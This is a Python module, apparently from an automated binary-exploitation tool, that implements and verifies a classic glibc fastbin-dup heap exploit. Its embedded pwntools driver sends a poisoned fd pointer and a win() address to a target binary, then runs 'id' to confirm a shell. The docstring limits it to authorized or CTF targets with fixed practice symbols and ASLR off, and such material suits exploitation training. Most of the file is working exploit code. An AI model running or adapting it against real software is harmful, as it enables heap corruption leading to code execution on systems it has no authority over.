"""Fastbin-dup (classic, pre-safe-linking), verified by execution.

The classic fastbin double-free: old glibc only rejected a free when the chunk equals the CURRENT
fastbin top, so freeing A, B, A slips the second free of A past the check and links A to itself.
Allocating then lets you poison A->fd toward a fake chunk; a later allocation returns that
attacker-chosen address -> overwrite a function pointer -> shell. The serve also checks
`chunksize(victim)==nb`, so the fake chunk needs a valid size qword (the classic "0x7f near a hook"
trick); binoracle verifies against a target whose allocator reproduces the pre-2.32 fastbin (weak
`==fasttop` double-free check + size check, no safe-linking), and degrades honestly otherwise. The
sandbox runs with ASLR off and `heap`/`hslot`/`win` are fixed symbols. For AUTHORIZED / CTF targets."""
from __future__ import annotations

from ._sandbox import elf_symbol_names, run_driver

_DRIVER = r'''
import sys, time
from pwn import ELF, context, p64, process
name = sys.argv[1]
context.binary = elf = ELF(name, checksec=False); context.log_level = "error"; context.arch = "amd64"
if elf.bits != 64:
    print("NOT_APPLICABLE (fastbindup driver is x86-64)"); sys.exit(1)

sym = elf.symbols or {}
hslot = sym.get("hslot") or sym.get("fake") or sym.get("hook_slot")
win = sym.get("win")
if hslot is None or win is None:
    print("NOT_APPLICABLE (no fastbin-dup shape: need hslot(fake chunk)+win symbols)"); sys.exit(1)

MARK = b"BINORACLE_FASTDUP_PWNED"
io = None
try:
    io = process([name], aslr=False)
    io.recvuntil(b"fd: ")
    io.send(p64(hslot))                  # poison A->fd = &hslot (fake chunk header)
    io.recvuntil(b"win: ")
    io.send(p64(win))                    # hslot.fn = win
    time.sleep(0.2)
    io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
    out = b""
    try: out = io.recvrepeat(1.1)
    except Exception: pass
    io.close()
    if (MARK in out) or (b"uid=" in out):
        print("VERIFIED hslot=%#x win=%#x" % (hslot, win)); sys.exit(0)
except Exception as e:
    try:
        if io: io.close()
    except Exception: pass
    print("ERROR %s" % e.__class__.__name__); sys.exit(1)
print("NOT_VERIFIED")
sys.exit(1)
'''


def _fastbindup_applicable(binary: str) -> bool:
    """Chequeo barato: necesita un chunk falso objetivo (hslot/fake/hook_slot) y win()."""
    names = elf_symbol_names(binary)
    if names is None:
        return True
    hslot = any(n in names for n in ("hslot", "fake", "hook_slot"))
    return hslot and "win" in names


def autofastbindup(binary: str) -> dict:
    """Fastbin-dup clasico verificado por ejecucion (contra un asignador que reproduce el fastbin
    pre-2.32: chequeo debil ==fasttop + chequeo de size, sin safe-linking). Necesita la forma de
    practica (hslot/win). Docker o sandbox nativo (ASLR off); degrada limpio."""
    if not _fastbindup_applicable(binary):
        return {"ok": False, "note": "no aplicable (sin hslot/fake/hook_slot + win)"}
    res = run_driver(binary, _DRIVER, ".binoracle_fastdup.py")
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"fastbin-dup clasico (doble-free A,B,A -> fd envenenado -> alloc en direccion "
                   f"elegida -> hijack -> shell): verificada por ejecucion ({eng})"
                   if res.get("verified")
                   else f"fastbin-dup: no verificado ({eng}) (sin la forma de practica o timing)")
    return res


def render_fastbindup(r: dict) -> str:
    out = ["## Auto fastbin-dup clasico (doble-free -> fd poison, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    out.append("\n_nota: el fastbin clasico (<2.32) no tiene safe-linking y solo rechaza el free si el "
               "chunk es el top del bin; A,B,A esquiva ese chequeo. El serve exige chunksize==nb "
               "(fake size)._")
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
